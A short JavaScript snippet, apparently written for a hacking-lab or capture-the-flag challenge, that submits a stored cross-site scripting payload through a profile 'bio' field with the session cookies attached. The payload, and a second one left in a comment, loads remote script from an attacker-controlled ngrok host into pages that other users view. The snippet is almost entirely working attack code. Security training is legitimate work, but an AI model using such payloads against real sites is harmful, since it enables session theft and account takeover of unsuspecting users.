const formData = new FormData();
formData.append("bio", "<script src=https://katabatic-pleadingly-jenae.ngrok-free.dev/blog2.js></script>");
// No adjuntamos archivo (equivalente a filename="")

fetch("https://chl-46e20df4-11bb-4168-b86b-90f032cd2764-blog-hacklab-v2.softwareseguro.com.ar/profile", {
  method: "POST",
  body: formData,
  credentials: "include"  // ⚠️ Esto incluye las cookies (como la de sesión)
});
// <script src=https://katabatic-pleadingly-jenae.ngrok-free.dev/blog1.js></script>